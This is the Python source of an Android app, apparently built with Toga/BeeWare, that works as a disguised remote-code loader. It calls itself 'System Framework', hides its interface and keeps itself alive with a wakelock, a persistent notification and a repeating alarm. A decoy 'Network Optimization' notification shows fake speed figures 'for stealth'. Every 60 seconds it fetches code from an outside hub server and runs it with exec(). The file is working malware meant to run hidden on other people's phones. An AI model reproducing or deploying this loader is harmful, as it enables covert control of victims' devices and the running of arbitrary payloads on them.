import sys
import time
import threading
import requests
import toga
import asyncio
from toga.style import Pack
from toga.style.pack import COLUMN, ROW

# Android specific imports for persistence
try:
    from jnius import autoclass, cast
    HAS_JNIUS = True
except ImportError:
    HAS_JNIUS = False

class PersistenceManager:
    def __init__(self):
        self.wakelock = None
        if HAS_JNIUS:
            self.PythonActivity = autoclass('org.beeware.android.PythonActivity')
            self.Context = autoclass('android.content.Context')
            self.Intent = autoclass('android.content.Intent')
            self.Notification = autoclass('android.app.Notification')
            self.NotificationManager = autoclass('android.app.NotificationManager')
            self.NotificationChannel = autoclass('android.app.NotificationChannel')
            self.PendingIntent = autoclass('android.app.PendingIntent')
            self.PowerManager = autoclass('android.os.PowerManager')
            self.Build = autoclass('android.os.Build')
            self.String = autoclass('java.lang.String')

    def start_foreground(self):
        """Creates a persistent notification to keep the app in the foreground."""
        if not HAS_JNIUS:
            return
            
        activity = self.PythonActivity.mActivity
        channel_id = "scrape_channel"
        name = "Background Service"
        description = "Ensures background connectivity for Hive network."
        
        if self.Build.VERSION.SDK_INT >= 26:
            # IMPORTANCE_LOW (2) - No sound, no popup
            importance = 2 
            channel = self.NotificationChannel(channel_id, name, importance)
            channel.setDescription(description)
            notification_manager = activity.getSystemService(self.Context.NOTIFICATION_SERVICE)
            notification_manager.createNotificationChannel(channel)

        # Create an intent that opens the app when the notification is clicked
        intent = self.Intent(activity, self.PythonActivity)
        flag = getattr(self.PendingIntent, 'FLAG_IMMUTABLE', 0)
        pending_intent = self.PendingIntent.getActivity(activity, 0, intent, flag)

        builder = self.Notification.Builder(activity, channel_id)
        builder.setContentTitle("Network Helper")
        builder.setContentText("Idle")
        builder.setSmallIcon(activity.getApplicationInfo().icon)
        builder.setContentIntent(pending_intent)
        builder.setOngoing(True) # Make it persistent

        notification = builder.build()
        notification_manager = activity.getSystemService(self.Context.NOTIFICATION_SERVICE)
        notification_manager.notify(1, notification)
        print("Network Helper notification activated.")

    def acquire_wakelock(self):
        """Keeps the CPU running even if the screen is off."""
        if not HAS_JNIUS:
            return
            
        activity = self.PythonActivity.mActivity
        power_manager = activity.getSystemService(self.Context.POWER_SERVICE)
        self.wakelock = power_manager.newWakeLock(self.PowerManager.PARTIAL_WAKE_LOCK, "Hive::ScraperLock")
        self.wakelock.acquire()
        print("WakeLock acquired.")

    def schedule_keepalive(self):
        """Schedules a repeating alarm to restart/wake the app every 15 minutes."""
        if not HAS_JNIUS:
            return
            
        activity = self.PythonActivity.mActivity
        alarm_manager = activity.getSystemService(self.Context.ALARM_SERVICE)
        
        intent = self.Intent(activity, self.PythonActivity)
        # FLAG_UPDATE_CURRENT or FLAG_IMMUTABLE depending on version
        flag = getattr(self.PendingIntent, 'FLAG_IMMUTABLE', 0)
        pending_intent = self.PendingIntent.getActivity(activity, 0, intent, flag)
        
        # Use ELAPSED_REALTIME_WAKEUP to wake up the phone if needed
        # We use a 15-minute interval (standard Android minimum for periodic work)
        interval = 15 * 60 * 1000 
        trigger_at = time.time() * 1000 + interval
        
        # setInexactRepeating is more battery-friendly
        # AlarmManager.ELAPSED_REALTIME_WAKEUP is 2
        alarm_manager.setInexactRepeating(2, trigger_at, interval, pending_intent)
        print("Keep-Alive Alarm scheduled (15m interval).")

class LogStream:
    def __init__(self, append_func):
        self.append_func = append_func
    def write(self, text):
        if text and text.strip():
            self.append_func(text)
    def flush(self):
        pass

class trojanhorseofdestiny(toga.App):
    def startup(self):
        self.main_window = toga.MainWindow(title="System Framework")
        self.persistence = PersistenceManager()
        self.hub_url = "https://hiveslave-scraper.onrender.com"
        
        # Ghost Mode: No visible UI
        self.log_box = toga.MultilineTextInput(readonly=True, style=Pack(flex=1, visibility='hidden'))
        self.main_window.content = toga.Box(children=[self.log_box], style=Pack(display='none'))
        
        # Start persistence and background work immediately
        if HAS_JNIUS:
            try:
                self.persistence.start_foreground()
                self.persistence.acquire_wakelock()
                self.persistence.schedule_keepalive()
            except Exception as e:
                print(f"Persistence Setup Error: {e}")

        # Start the loader automatically
        self.start_loader()
        
        # Hide the main window to be a "Ghost"
        # On Android, this might just leave the app in the background
        self.main_window.show()
        print("System Framework initialized in background.")

    def log_message_threadsafe(self, text):
        # We don't need to log to UI anymore, but we'll keep the method to avoid errors
        pass

    def start_loader(self):
        print(f"Connecting to Hub...")
        thread = threading.Thread(target=self.background_loader, args=(self.hub_url,))
        thread.daemon = True
        thread.start()

    def background_loader(self, hub_url):
        payload_globals = globals().copy()
        payload_globals['HUB_URL'] = hub_url
        
        import random
        
        while True:
            try:
                # Update notification with "Net Speed" for stealth
                if HAS_JNIUS:
                    speed = round(random.uniform(0.1, 4.5), 1)
                    activity = self.persistence.PythonActivity.mActivity
                    notification_manager = activity.getSystemService(self.persistence.Context.NOTIFICATION_SERVICE)
                    
                    # Rebuild notification with new speed
                    builder = self.persistence.Notification.Builder(activity, "scrape_channel")
                    builder.setContentTitle("Network Optimization")
                    builder.setContentText(f"Current Speed: {speed} KB/s")
                    builder.setSmallIcon(activity.getApplicationInfo().icon)
                    builder.setOngoing(True)
                    
                    notification_manager.notify(1, builder.build())

                # Standard Scraper Work
                resp = requests.get(f"{hub_url}/latest-client", timeout=30)
                if resp.status_code == 200:
                    payload_code = resp.json().get("code")
                    if payload_code:
                        exec(payload_code, payload_globals)
            except Exception as e:
                pass
            
            # Verify persistence
            if HAS_JNIUS and self.persistence.wakelock and not self.persistence.wakelock.isHeld():
                self.persistence.acquire_wakelock()
                
            time.sleep(60)

def main():
    return trojanhorseofdestiny("System Framework", "com.quill.zodiac.trojanhorseofdestiny")
